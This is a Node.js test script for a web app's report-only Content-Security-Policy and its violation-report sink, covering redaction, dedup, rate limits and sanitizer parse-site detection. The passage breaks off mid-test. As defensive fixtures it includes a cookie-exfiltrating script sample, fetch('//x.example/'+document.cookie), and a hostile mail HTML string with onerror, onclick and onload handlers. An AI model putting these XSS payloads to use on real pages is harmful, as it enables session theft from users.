#!/usr/bin/env node
// THE APP PAGE'S CONTENT-SECURITY-POLICY, REPORT-ONLY (lane app-page-csp — design q-043 D6, §5 row P0-d): src/app-csp.js
// (the policy + a report as a line) and src/server/csp-reports.js (POST /api/csp-report → data/csp-reports.jsonl + one
// For-you notice per new pair). Fast tier: express on 127.0.0.1, the real sink on a scratch dir, server.js's OWN index
// route and sink line run verbatim (read off server.js), the real Auth's sign-in page.
//   ① the policy: every directive pinned (default-src 'self', script-src 'self' with no inline / eval + 'report-sample' —
//      it allows nothing; a report carries the first 40 characters of the code it names (lane chrome-156-drift) —, object-src 'none',
//      base-uri 'self', frame-ancestors 'self', report-uri, no report-to) — MUTANT: object-src dropped ⇒ RED
//   ② a report as a line: no value (no sample, no query, no fragment), a URL cut to origin + 3 segments, the Reporting-API
//      shape too, an unknown directive dropped; a kept segment that looks like a token cut to `<token>` (B-a35f, q-043 verify
//      L4 — MUTANT: the cut dropped ⇒ RED); ③b over the route, the stored line and the For-you notice hold `<token>`;
//      ②b/③c (lane chrome-156-drift) the ONE exception: a script-src report's sample is kept only when asked for — a chrome
//      suite's sink (handed the suite's file) keeps it, ≤ 40 characters; a hub's own data/ never; ⑥b the teardown's words
//      (cspWhat) name the sample and say a line with no source is the SUITE's own evaluated code
//   ③d THE SANITIZER'S PARSE IS NOT A GAP (lane chrome-156-followups): Chrome 156 reports a handler DOMPurify's inert parse
//      set and dropped — the release build and the chrome suites' build rebuilt in memory, EVERY parseFromString call in each
//      named by the bundle's symbol map (scripts/symbolicate.mjs lookupMany): purifyParseSites finds exactly DOMPurify's
//      (MUTANT: the signature cut to the call ⇒ the docx viewer's too, RED); a hostile .md's and an agent's markdown's
//      reports there ⇒ ONE `sanitizer-parse` line, its own count, NO notice; the CONTROL — the same attribute set by our own
//      code (file-viewer's innerHTML) — a line and the notice; no sample / another origin / another script / another build /
//      no bundle ⇒ what a report always was; a hostile MAIL never reaches the parse with a handler (mail-frame step 1);
//      ⑥c a suite's sanitizer line is printed, never a failure
//   ③ the route: a fake report lands as ONE line; the duplicate is still one line + ONE notice; the same pair on another
//      line is a second line and no second notice; a restart re-writes and re-notices nothing; a report from a FRAME the
//      page made (document about / blob / data) is a line and NO notice (主开发's ruling 2) — the count tells them apart
//   ③e EVERY SANITIZER THE APP SHIPS (lane csp-mermaid-sites): the diagram library bundles its OWN DOMPurify — every script
//      the build serves built in memory (each esbuild step of package.json + scripts/build-novnc.mjs): a build that carries
//      the dompurify package has exactly ONE parse site, one without has none, and app-csp PARSE_SCRIPTS = exactly the
//      scripts with one (MUTANT: /mermaid.js cut from the table ⇒ RED by name, and the hostile diagram's report files the
//      notice again); mermaid.js's site pinned on its symbol map; the test-chat-mermaid-chrome ⑦ label's report AT it ⇒ the
//      sanitizer's line, no notice; the CONTROL — the same directive from mermaid.js at ANOTHER line ⇒ the app's line and
//      its notice; another build / the bundle's stamp / the bundle's site named in mermaid.js (and the reverse) / no
//      mermaid.js on disk ⇒ the notice — each script by its own `?v=` and its own sites
//   ④ bounds: a 10 MB body ⇒ 413 and nothing lands; not a report type ⇒ 415; the 61st post a minute from one address ⇒ 429;
//      (a repeat is never paced); past 1 MB the file rotates to .1; ≤ 10 new pairs a day file
//   ⑤ the app page (server.js's index route, verbatim): the report-only header with the pinned directives; the ENFORCING
//      header is NOT sent (MUTANT: the header renamed ⇒ RED); server.js mounts the sink before the json body parser and hands
//      it VIBESPACE_CSP_REPORTS_FILE; the sign-in page reports too (its inline script's nonce is in its policy)
//   ⑥ the chrome suites' teardown (scripts/scratch.mjs): a suite whose hub got a report FAILS at exit and prints it; a clean
//      one passes — MUTANT: the check cut ⇒ the reported suite passes (RED)
//   ⑦ THE FRAME HOST (lane design-frame-host, B-8679): GET /frame-host?kind=design|mail through server.js's own line and the
//      REAL sign-in gate — each kind's policy as a real header, always a `sandbox` (MUTANT: the design kind's sandbox cut ⇒
//      RED), no report-uri, the mail kind = mail-frame.js cspFor with the address's nonce + the host's own script hash (the
//      served document's one script hashes to it), a bad kind 404, no cookie ⇒ the gate; the handshake in a fake DOM — the
//      client writer posts the document on the HOST's load only and hides that load from the caller (MUTANT: no
//      stopImmediatePropagation ⇒ RED), the host writes once, from its parent only (MUTANT: no source check ⇒ RED); the
//      exception list is EMPTY; the address `/frame-host` lives in the builders (+ src/lib/frame-host.js hostAddress) and
//      the route, nowhere in public/
//   ⑧ FOREIGN HTML IN THE FRAME HOST (lane frame-host-preview, B-5b2c): the kinds preview / eml / docx — each header
//      always a sandbox, never allow-same-origin, no report-uri; preview = its own scripts + styles + data:/blob: + https:
//      + ITS FOLDER by full address (never 'self'); eml / docx = the mail policy with a nonce made per RESPONSE (never the
//      host's hash); the folder: a base judged on the signed-in navigation ⇒ 302 to /frame-host/f/<token>/, a DOOR with no
//      cookie (src/auth.js, GET only) serving a web file under the folder — .env, key.pem, a symlink out, ../, an unknown
//      token never answered; the token's life and cap; THE CENSUS over src/lib: allow-same-origin and srcdoc only where a
//      reason row names the site — MUTANTS: allow-same-origin back on the preview, srcdoc back on each of the three ⇒ RED
//   ⑨ THE SOURCE MAP IS SERVED TO NOBODY (lane vault-chip-zone-errors): server.js's own static line (src/server/
//      static-public.js) beside its index route, verbatim, over a public/ that HOLDS bundle.js.map — GET /bundle.js 200,
//      GET /bundle.js.map and its escaped spellings 404 (never the map's bytes), a later route's own .map path still answers,
//      the page names no map; the line sits after the index route and before WebDAV — MUTANT: the guard cut ⇒ the map is
//      served (RED)
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import Module, { createRequire } from 'node:module';
import { spawnSync } from 'node:child_process';
import { scratch, cspWhat, cspSanitizerLine } from './scratch.mjs';
const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const express = require(path.join(REPO, 'node_modules/express'));
const C = require(path.join(REPO, 'src/app-csp.js'));
const SINK = require(path.join(REPO, 'src/server/csp-reports.js'));
const { Auth } = require(path.join(REPO, 'src/auth.js'));
let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 800) : '')); } };
const ROOT = scratch('csp-report');
fs.rmSync(ROOT, { recursive: true, force: true }); fs.mkdirSync(ROOT, { recursive: true });
/** A module from a source text at its REAL path (relative requires resolve) — the mutant loader. */
const load = (abs, src) => { const m = new Module(abs, null); m.filename = abs; m.paths = Module._nodeModulePaths(path.dirname(abs)); m._compile(src, abs); return m.exports; };
const readRepo = (f) => fs.readFileSync(path.join(REPO, f), 'utf8');

// ── ① THE POLICY ──
console.log('① the policy — every directive pinned');
const PINS = [   // THE MEASURED POLICY, every directive (the lane's report says what each source is for) — a change moves a pin here
  ['default-src', ["'self'"]], ['script-src', ["'self'", "'report-sample'"]], ['style-src', ["'self'", "'unsafe-inline'"]],
  ['img-src', ["'self'", 'data:', 'blob:', 'https:']], ['font-src', ["'self'", 'blob:']], ['connect-src', ["'self'", 'blob:']],
  ['media-src', ["'self'", 'blob:']], ['worker-src', ["'self'"]], ['frame-src', ["'self'", 'blob:', 'http:', 'https:']],
  ['object-src', ["'none'"]], ['base-uri', ["'self'"]], ['form-action', ["'self'"]], ['frame-ancestors', ["'self'"]],
];
/** The pins a header value breaks: [] = all hold. */
function pinFails(value) {
  const dirs = new Map(String(value || '').split(';').map((p) => p.trim().split(/\s+/)).filter((a) => a[0]).map(([d, ...s]) => [d, s]));
  const out = [];
  for (const [d, want] of PINS) if (JSON.stringify(dirs.get(d) || null) !== JSON.stringify(want)) out.push(`${d}: ${JSON.stringify(dirs.get(d) || null)}`);
  for (const d of ['script-src', 'default-src']) if ((dirs.get(d) || []).some((s) => /unsafe-inline|unsafe-eval|unsafe-hashes|\*|https?:|data:|blob:/.test(s))) out.push(`${d} lets in more than this origin`);
  if (JSON.stringify(dirs.get('report-uri') || null) !== JSON.stringify([C.REPORT_PATH])) out.push('report-uri');
  if (dirs.has('report-to')) out.push('report-to (Chrome then ignores report-uri and batches — the suites could not count on it)');
  for (const [d, s] of dirs) if (d !== 'report-uri' && !PINS.some(([p]) => p === d)) out.push(`an unpinned directive ${d} ${s.join(' ')}`);
  return out;
}
const POLICY = C.appPolicy();
ok(pinFails(POLICY).length === 0, `the app policy holds every pin: ${POLICY}`, pinFails(POLICY));
ok(C.HEADER === 'Content-Security-Policy-Report-Only' && C.ENFORCE_HEADER === 'Content-Security-Policy', 'the header is the REPORT-ONLY one (the enforcing name is declared, never sent)');
{
  const src = readRepo('src/app-csp.js');
  const cut = "  ['object-src', [\"'none'\"]],\n";
  ok(src.includes(cut), 'the mutant anchor (the object-src row) is in src/app-csp.js');
  const M = load(path.join(REPO, 'src/app-csp.js'), src.replace(cut, ''));
  ok(pinFails(M.appPolicy()).some((f) => /^object-src/.test(f)), 'MUTANT (object-src \'none\' dropped) ⇒ RED: the pin names it', pinFails(M.appPolicy()));
}

// ── ② A REPORT AS A LINE ──
console.log('② a report as a line — never a value');
const SECRET = 'tok-SECRET-7f3a';
const report = (o = {}) => ({ 'csp-report': { 'document-uri': `http://127.0.0.1:1/?k=${SECRET}#${SECRET}`, referrer: `http://x/?r=${SECRET}`, 'violated-directive': 'img-src', 'effective-directive': 'img-src', 'original-policy': POLICY, disposition: 'report', 'blocked-uri': 'https://' + 'user:' + SECRET + '@cdn.example.net/a/b/c/d/e.png?sig=' + SECRET, /* user:pass built at run time (the secret scan) */ 'line-number': 12, 'column-number': 7, 'source-file': `http://127.0.0.1:1/bundle.js?v=${SECRET}`, 'status-code': 200, 'script-sample': `steal(${SECRET})`, ...o } });
{
  const [r] = C.reportsOf(JSON.stringify(report()));
  ok(r && r.directive === 'img-src' && r.blocked === 'https://cdn.example.net/a/b/c/…' && r.source === 'http://127.0.0.1:1/bundle.js' && r.line === 12 && r.column === 7 && r.document === 'http://127.0.0.1:1/', 'a URL is its origin + 3 path segments — no user:pass, no query, no fragment', r);
  ok(!JSON.stringify(r).includes(SECRET) && !('sample' in r) && !('referrer' in r) && !('original-policy' in r), 'no value in the line (the sample, the query, the referrer are not read)', r);
  const kw = C.reportsOf(JSON.stringify(report({ 'blocked-uri': 'inline', 'effective-directive': 'script-src-elem', 'source-file': 'about', 'document-uri': 'about' })))[0];
  ok(kw && kw.blocked === 'inline' && kw.document === 'about', 'a keyword stays a keyword (inline, about)', kw);
  ok(C.uriOf(`data:text/html,<script>${SECRET}</script>`) === 'data' && C.uriOf('chrome-extension://abcdefghijklmnop/x.js?q=1') === 'chrome-extension://abcdefghijklmnop' && C.uriOf('blob:http://h/uuid') === 'blob', 'a data: URL is its scheme; an extension is its id; a blob: URL its scheme');
  ok(C.reportsOf(JSON.stringify(report({ 'effective-directive': 'evil-src', 'violated-directive': 'evil-src' }))).length === 0, 'a directive outside the CSP vocabulary is dropped');
  // B-a35f (q-043 verify L4): a KEPT segment that looks like a token is cut to <token> — ≥ 16 of [A-Za-z0-9_-], any ≥ 32, the hub's own prefixes
  const CUTS = [
    ['https://h.example.net/share/abcdEFGH1234_-xy/x', 'https://h.example.net/share/<token>/x', '16 characters of [A-Za-z0-9_-]'],
    [`https://h.example.net/${'a.b'.repeat(11)}/x`, 'https://h.example.net/<token>/x', 'any segment of 32 or more'],
    ['https://h.example.net/p/vi-0123456789ab', 'https://h.example.net/p/<token>', 'a hub token prefix (vsst_ jbt_ vsrt_ vi-)'],
    ['https://h.example.net/abcdefghijklmno/x', 'https://h.example.net/abcdefghijklmno/x', '15 characters stay'],
    ['https://h.example.net/fonts/v2/a.b-c.woff2', 'https://h.example.net/fonts/v2/a.b-c.woff2', 'short segments stay'],
    ['https://h.example.net/a/b/c/abcdEFGH1234_-xy', 'https://h.example.net/a/b/c/…', 'past the third segment the count cuts already'],
  ];
  const cutBad = CUTS.filter(([u, want]) => C.uriOf(u) !== want).map(([u, want, why]) => ({ why, got: C.uriOf(u), want }));
  ok(!cutBad.length, `a kept path segment that looks like a token is cut to <token> (${CUTS.map((c) => c[2]).join('; ')})`, cutBad);
  const srcT = readRepo('src/app-csp.js'), cutT = ".map((g) => (TOKEN_SEGMENT.test(g) ? '<token>' : g))";
  const MT = srcT.split(cutT).length === 2 ? load(path.join(REPO, 'src/app-csp.js'), srcT.replace(cutT, '')) : null;
  ok(MT && MT.uriOf(CUTS[0][0]) === 'https://h.example.net/share/abcdEFGH1234_-xy/x', 'MUTANT (the segment cut dropped) ⇒ RED: the token is kept in the line', MT && MT.uriOf(CUTS[0][0]));
  const rapi = C.reportsOf(JSON.stringify([{ type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'eval', sourceFile: 'http://h/x.js', lineNumber: 3, documentURL: 'http://h/', disposition: 'report', sample: SECRET } }, { type: 'deprecation', body: {} }]));
  ok(rapi.length === 1 && rapi[0].blocked === 'eval' && rapi[0].line === 3 && !JSON.stringify(rapi).includes(SECRET), 'the Reporting-API shape (application/reports+json) reads the same, other report types skipped', rapi);
  ok(C.reportsOf('not json').length === 0 && C.reportsOf('{}').length === 0 && C.reportsOf(JSON.stringify(Array(50).fill({ type: 'csp-violation', body: { effectiveDirective: 'img-src', blockedURL: 'data' } }))).length === 20, 'not JSON / no report ⇒ nothing; at most 20 reports a post');
}

// ── ②b THE ONE EXCEPTION: A SAMPLE, ONLY WHEN ASKED (lane chrome-156-drift) ──
console.log('②b a script-src report\'s sample — kept only when asked for (a chrome suite\'s hub), ≤ 40 characters, script-src only');
{
  const attr = report({ 'effective-directive': 'script-src-attr', 'violated-directive': 'script-src-attr', 'blocked-uri': 'inline', 'source-file': '', 'line-number': 1, 'column-number': 101, 'script-sample': 'window.__xss=1' + 'x'.repeat(60) });
  const [plain] = C.reportsOf(JSON.stringify(attr)), [asked] = C.reportsOf(JSON.stringify(attr), { sample: true });
  ok(plain && !('sample' in plain) && asked && asked.sample === ('window.__xss=1' + 'x'.repeat(60)).slice(0, C.SAMPLE_MAX) && C.SAMPLE_MAX === 40 && asked.line === 1 && asked.column === 101 && asked.source === '', 'a script-src-attr report: no sample by default; asked for, the handler\'s first 40 characters (the browser\'s own cut) beside its position', { plain, asked });
  const [img] = C.reportsOf(JSON.stringify(report()), { sample: true });
  ok(img && !('sample' in img) && !JSON.stringify(img).includes(SECRET), 'an img-src report never carries a sample, asked or not (only code is sampled)', img);
  const api = C.reportsOf(JSON.stringify([{ type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'inline', sourceFile: '', lineNumber: 1, documentURL: 'http://h/', disposition: 'report', sample: 'alert(1)' } }]), { sample: true });
  ok(api.length === 1 && api[0].sample === 'alert(1)', 'the Reporting-API shape names its sample `sample` — read the same way', api);
  ok(C.lineKey({ ...asked, sample: 'a()' }) !== C.lineKey({ ...asked, sample: 'b()' }) && C.lineKey(plain) === C.lineKey({ ...asked, sample: undefined }), 'two handlers at one position are two lines in a suite\'s file; a line without a sample keys as it always did');
}

// ── ③ THE ROUTE ──
console.log('③ the route — one line per report key, one notice per pair');
function hub({ dir, sinkModule = SINK, ...o } = {}) {
  const added = [];
  const todos = { add: (key, it) => { added.push({ key, ...it }); return { id: 'ut-' + added.length }; } };
  const sink = sinkModule.create({ dataDir: dir, getUserTodos: () => todos, log: { log() { }, warn() { } }, ...o });
  const app = express(); sink.register(app); app.use(express.json());
  app.post('/after', (req, res) => res.json({ reached: true }));
  return new Promise((r) => { const srv = app.listen(0, '127.0.0.1', () => r({ sink, added, srv, port: srv.address().port, close: () => new Promise((c) => srv.close(c)) })); });
}
const post = (H, body, { type = 'application/csp-report', p = C.REPORT_PATH, raw = null } = {}) => new Promise((resolve, reject) => {
  const b = raw || Buffer.from(typeof body === 'string' ? body : JSON.stringify(body));
  const r = http.request({ host: '127.0.0.1', port: H.port, path: p, method: 'POST', headers: { 'content-type': type, 'content-length': b.length } }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, text: d })); });
  r.on('error', (e) => resolve({ status: 0, error: e.code }));
  r.end(b);
});
const linesOf = (f) => { try { return fs.readFileSync(f, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
const D1 = path.join(ROOT, 'one', 'data'); fs.mkdirSync(D1, { recursive: true });
const FILE1 = path.join(D1, SINK.FILE);
{
  const H = await hub({ dir: D1 });
  const a = await post(H, report());
  ok(a.status === 204 && linesOf(FILE1).length === 1, 'a fake report ⇒ 204, ONE line in data/csp-reports.jsonl', { status: a.status, lines: linesOf(FILE1) });
  ok(H.added.length === 1 && H.added[0].key === SINK.NOTICE_KEY && H.added[0].origin === 'server' && H.added[0].kind === 'notice' && /would block img-src: https:\/\/cdn\.example\.net/.test(H.added[0].text), 'the new pair files ONE For-you notice (origin server) naming the directive and what it would block', H.added);
  ok(!fs.readFileSync(FILE1, 'utf8').includes(SECRET) && !JSON.stringify(H.added).includes(SECRET), 'no value in the file or the notice');
  ok((fs.statSync(FILE1).mode & 0o777) === 0o600, 'the file is 0600');
  const b = await post(H, report());
  ok(b.status === 204 && linesOf(FILE1).length === 1 && H.added.length === 1, 'the DUPLICATE ⇒ still one line, still one notice', { lines: linesOf(FILE1).length, notices: H.added.length });
  await post(H, report({ 'line-number': 99 }));
  ok(linesOf(FILE1).length === 2 && H.added.length === 1, 'the same pair on another line ⇒ a second line, no second notice (one notice per pair, never per report)', { lines: linesOf(FILE1).length, notices: H.added.length });
  await post(H, report({ 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' }));
  ok(linesOf(FILE1).length === 3 && H.added.length === 2, 'a NEW pair ⇒ a line and its own notice', { notices: H.added.map((x) => x.text) });
  const after = await post(H, {}, { type: 'application/json', p: '/after' });
  ok(after.status === 200, 'the routes after the sink still get their json body (the sink is its own reader)', after);
  const fr = await post(H, report({ 'document-uri': 'about', 'source-file': 'about', 'effective-directive': 'img-src', 'blocked-uri': 'http://tracker.example.net/p.gif?u=' + SECRET }));
  await post(H, report({ 'document-uri': 'blob', 'source-file': 'blob', 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' }));
  ok(fr.status === 204 && linesOf(FILE1).length === 5 && H.added.length === 2 && linesOf(FILE1).filter((l) => l.document === 'about' || l.document === 'blob').every((l) => !l.noticed), 'a report from a frame the page made (a mail\'s tracker in a srcdoc frame, a blob: page) ⇒ a line, NO notice (the owner cannot act on it)', { lines: linesOf(FILE1).length, notices: H.added.length });
  const sum = H.sink.summary();
  ok(sum.policy === 'report-only' && sum.app.lines === 3 && sum.frames.lines === 2 && sum.frames.reports === 2 && sum.app.reports === 4 && sum.noticed === 2, 'the count: the app page\'s lines / reports apart from the frames\' (what the Diagnostics chip shows)', sum);
  const g = await new Promise((resolve) => http.get({ host: '127.0.0.1', port: H.port, path: '/api/csp-reports' }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, json: JSON.parse(d) })); }));
  ok(g.status === 200 && JSON.stringify(g.json) === JSON.stringify(sum), 'GET /api/csp-reports answers the count', g);
  await H.close();
  const H2 = await hub({ dir: D1 });
  await post(H2, report()); await post(H2, report({ 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' }));
  ok(linesOf(FILE1).length === 5 && H2.added.length === 0 && H2.sink.summary().app.lines === 3 && H2.sink.summary().frames.lines === 2, 'a RESTART reads the keys on disk: the same reports write nothing and file nothing; the count of lines is read back', { lines: linesOf(FILE1).length, notices: H2.added.length, sum: H2.sink.summary() });
  await H2.close();
}

// ── ③c A CHROME SUITE'S SINK KEEPS THE SAMPLE; A HUB'S OWN NEVER (lane chrome-156-drift) ──
console.log('③c a sink handed a suite\'s file keeps a script-src report\'s sample; the same post to a hub\'s own data/ keeps none');
{
  const DS = path.join(ROOT, 'suite', 'data'), DO = path.join(ROOT, 'own', 'data'); fs.mkdirSync(DS, { recursive: true }); fs.mkdirSync(DO, { recursive: true });
  const SUITE_FILE = path.join(ROOT, 'suite', 'csp-reports.jsonl');
  const HS = await hub({ dir: DS, file: SUITE_FILE }), HO = await hub({ dir: DO });
  const attr = report({ 'effective-directive': 'script-src-attr', 'violated-directive': 'script-src-attr', 'blocked-uri': 'inline', 'source-file': '', 'line-number': 1, 'column-number': 101, 'script-sample': 'window.__xss=1' });
  const a = await post(HS, attr), b = await post(HO, attr);
  const ls = linesOf(SUITE_FILE), lo = linesOf(path.join(DO, SINK.FILE));
  ok(a.status === 204 && ls.length === 1 && ls[0].sample === 'window.__xss=1' && ls[0].column === 101, 'a chrome suite\'s sink (an explicit file — VIBESPACE_CSP_REPORTS_FILE) keeps the handler\'s sample: the teardown can say WHAT was reported', ls);
  ok(b.status === 204 && lo.length === 1 && !('sample' in lo[0]) && !fs.readFileSync(path.join(DO, SINK.FILE), 'utf8').includes('__xss'), 'the same post to a hub\'s own data/csp-reports.jsonl keeps none (never a value in the hub\'s file)', lo);
  await HS.close(); await HO.close();
}

// ── ③d THE SANITIZER'S PARSE IS NOT A GAP (lane chrome-156-followups) ──
// Chrome 156 reports an inline handler when its attribute is SET — DOMPurify's inert DOMParser parse of a hostile .md
// (test-channel-window-render ⑭, measured: «window.__pwned=14», bundle.js 127564:35 on the suites' build) sets the one it
// drops. The collector names such a report `sanitizer-parse` by the BUNDLE'S CODE at the browser's position — pinned here
// on the bundle's symbol map (scripts/symbolicate.mjs), for the release build (package.json's step) and the chrome
// suites' build, never on a column alone.
console.log('③d a handler the sanitizer\'s inert parse set and dropped is `sanitizer-parse` — its own count, never a notice; pinned on the bundle\'s symbol map');
{
  const SYM = await import(path.join(REPO, 'scripts/symbolicate.mjs'));
  const esbuild = require(path.join(REPO, 'node_modules/esbuild'));
  const MF = require(path.join(REPO, 'src/mail-frame.js'));
  const rel = SYM.clientBuildOptions(JSON.parse(readRepo('package.json')));
  // the chrome suites' build: the release step without --minify — read off a suite that builds it
  const suiteStep = (/execSync\('npx esbuild (src\/client\.js [^']+)'/.exec(readRepo('scripts/test-channel-window-render.mjs')) || [])[1];
  const suiteFlags = suiteStep ? suiteStep.split(/\s+/).slice(1).sort() : null;
  ok(JSON.stringify(suiteFlags) === JSON.stringify(SYM.flagsOf({ ...rel, minify: false })), 'the chrome suites build the client with package.json\'s step minus --minify (read off test-channel-window-render) — the two builds pinned below', suiteFlags);
  /** [line, column] (1-based, V8's line terminators) of every index in `at` */
  const posOf = (js, at) => { const out = []; let line = 1, start = 0; const re = /\r\n?|[\n\u2028\u2029]/g; for (const p of at) { re.lastIndex = start; for (let m = re.exec(js); m && m.index < p; m = re.exec(js)) { line++; start = m.index + m[0].length; } out.push([line, p - start + 1]); } return out; };
  const allAt = (js, needle, skip = 0) => { const a = []; for (let i = js.indexOf(needle); i >= 0; i = js.indexOf(needle, i + 1)) a.push(i + skip); return a; };
  const builds = {};
  for (const [name, o] of [['release', rel], ['suites', { ...rel, minify: false }]]) {
    const r = await esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, metafile: true, write: false, logLevel: 'silent' });
    const js = Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.js')).contents).toString('utf8');
    const map = JSON.parse(Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.map')).contents).toString('utf8'));
    // EVERY parseFromString call in the bundle, by its text — and what the bundle's symbol map says each one is
    const calls = posOf(js, allAt(js, '.parseFromString(', 1));
    const said = SYM.lookupMany(map, calls);
    const is = ([l, c]) => said.get(`${l}:${c}`);
    const purify = calls.filter((p) => is(p) && /node_modules\/dompurify\//.test(is(p).source) && is(p).name === 'parseFromString');
    const sites = C.purifyParseSites(js);
    const others = calls.filter((p) => !purify.includes(p)).map((p) => `${(is(p) || {}).source || '?'}`.replace(/^(\.\.\/)+/, ''));
    ok(calls.length >= 2 && purify.length === 1 && JSON.stringify(sites) === JSON.stringify(purify), `${name} build: the symbol map names ONE of the bundle's ${calls.length} parseFromString calls DOMPurify's (${is(purify[0] || [0, 0]) ? is(purify[0]).source.replace(/^(\.\.\/)+/, '') + ':' + is(purify[0]).line : '?'}) and purifyParseSites finds exactly it, at ${JSON.stringify(sites)} — never ${others.join(', ')}`, { calls, purify, sites, others });
    // an app-code position that writes HTML into the live page: file-viewer's markdown (what a handler set by OUR code would be reported at)
    const writes = posOf(js, allAt(js, '.innerHTML', 1));
    const own = SYM.lookupMany(map, writes);
    const appWrite = writes.find(([l, c]) => { const p = own.get(`${l}:${c}`); return p && /src\/lib\/file-viewer\.js$/.test(p.source); });
    builds[name] = { js, site: sites[0], appWrite, inputs: Object.keys(r.metafile.inputs) };
  }
  ok(builds.suites.site && builds.suites.site[1] === 35 && /^ +doc\d* = new DOMParser\d*\(\)\.$/.test(builds.suites.js.split('\n')[builds.suites.site[0] - 1].slice(0, 34)), 'the suites\' build spells the parse as Chrome 156 named it on the runner (bundle.js L:35 — measured 127564:35, the `parseFromString` of `doc = new DOMParser().parseFromString(…)`)', builds.suites.site);
  {
    const src = readRepo('src/app-csp.js');
    const sig = /^const PURIFY_PARSE = \/.*\/;$/m;
    ok(sig.test(src), 'the mutant anchor (the parse signature, PURIFY_PARSE) is in src/app-csp.js');
    const M = load(path.join(REPO, 'src/app-csp.js'), src.replace(sig, 'const PURIFY_PARSE = /^parseFromString\\(/;'));
    const loose = M.purifyParseSites(builds.release.js);
    ok(loose.length > 1, `MUTANT (the signature cut to the call alone) ⇒ RED: ${loose.length} sites — the docx viewer's parse would be called the sanitizer's`, loose);
  }
  // THE REPORTS — the shape Chrome 156 posts (report-uri, application/csp-report), at the build the page loaded
  const PUB = path.join(ROOT, 'sanitizer', 'public'); fs.mkdirSync(PUB, { recursive: true });
  const BUNDLE = path.join(PUB, 'bundle.js');
  fs.writeFileSync(BUNDLE, builds.suites.js);
  const V = String(Math.floor(fs.statSync(BUNDLE).mtimeMs));
  const ORIGIN = 'http://127.0.0.1:1';
  const handler = (sample, [line, column], o = {}) => ({ 'csp-report': { 'document-uri': `${ORIGIN}/`, referrer: '', 'violated-directive': 'script-src-attr', 'effective-directive': 'script-src-attr', 'original-policy': POLICY, disposition: 'report', 'blocked-uri': 'inline', 'line-number': line, 'column-number': column, 'source-file': `${ORIGIN}/bundle.js?v=${V}`, 'status-code': 200, 'script-sample': sample, ...o } });
  const MD = handler('window.__pwned=14', builds.suites.site);                 // a peer's hostile .md (⑭ — the measured report)
  const CHAT = handler('fetch(\'//x.example/\'+document.cookie)', builds.suites.site); // an agent's markdown in the chat — the same one parse
  const CONTROL = handler('window.__pwned=14', builds.suites.appWrite);        // the SAME attribute set by OUR code (file-viewer's innerHTML)
  const [md] = C.reportsOf(JSON.stringify(MD), { site: true }), [ctl] = C.reportsOf(JSON.stringify(CONTROL), { site: true });
  ok(md && md.site && md.site.script === '/bundle.js' && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && ctl && ctl.site, 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
  const siteless = [
    ['no sample (not a handler\'s code)', handler('', builds.suites.site)],
    ['another origin\'s bundle.js', handler('window.__pwned=14', builds.suites.site, { 'source-file': `http://evil.example/bundle.js?v=${V}` })],
    ['another script of this origin', handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/design-viewer.js?v=${V}` })],
    ['an inline script (script-src-elem)', handler('window.__pwned=14', builds.suites.site, { 'effective-directive': 'script-src-elem', 'violated-directive': 'script-src-elem' })],
    ['a frame the page made (document about)', handler('window.__pwned=14', builds.suites.site, { 'document-uri': 'about' })],
  ];
  for (const [why, r] of siteless) { const [x] = C.reportsOf(JSON.stringify(r), { site: true }); ok(x && !x.site, `not a candidate: ${why}`, x); }
  // a MAIL: its body reaches the frame's DOMPurify only through mail-frame step 1, the allowlist re-serializer — no handler
  // survives it, so the mail frame's parse never sets one (measured: 0 reports on Chrome 156); were one to reach it, it is
  // the same parse site (ONE DOMPurify in the bundle — the symbol map above), so the same kind
  const HOSTILE_MAIL = '<p>Invoice</p><img src=x onerror="window.__mail=1"><a href="https://x.example/" onclick="window.__mail=2">pay</a><div ONMOUSEOVER=window.__mail=3>y</div><svg onload=window.__mail=4></svg>';
  const step1 = MF.sanitizeMailHtml(HOSTILE_MAIL, {});
  ok(step1.ok && !/\son[a-z]+\s*=/i.test(step1.html) && !step1.html.includes('__mail'), 'a hostile MAIL: mail-frame step 1 drops every handler before DOMPurify ever parses it (no report can come from the mail frame)', step1.html);
  // THROUGH THE SINK: a hub's own data/ (no sample kept — the kind is judged, the sample never written) and a suite's file
  const DH = path.join(ROOT, 'sanitizer', 'hub', 'data'); fs.mkdirSync(DH, { recursive: true });
  const FH = path.join(DH, SINK.FILE);
  {
    const H = await hub({ dir: DH, publicDir: PUB });
    const a = await post(H, MD);
    const l1 = linesOf(FH);
    ok(a.status === 204 && l1.length === 1 && l1[0].kind === C.KIND_SANITIZER && !('site' in l1[0]) && !('sample' in l1[0]) && !fs.readFileSync(FH, 'utf8').includes('__pwned') && H.added.length === 0, 'the hostile .md\'s report (the sanitizer\'s parse) ⇒ ONE line of kind `sanitizer-parse` and NO For-you notice; the sample judged it and was never written', { l1, notices: H.added });
    await post(H, CHAT);
    ok(linesOf(FH).length === 1 && H.added.length === 0, 'an agent\'s hostile markdown in the chat — the same parse, another handler ⇒ the same line (a hub keeps no sample), still no notice', linesOf(FH));
    const sum1 = H.sink.summary();
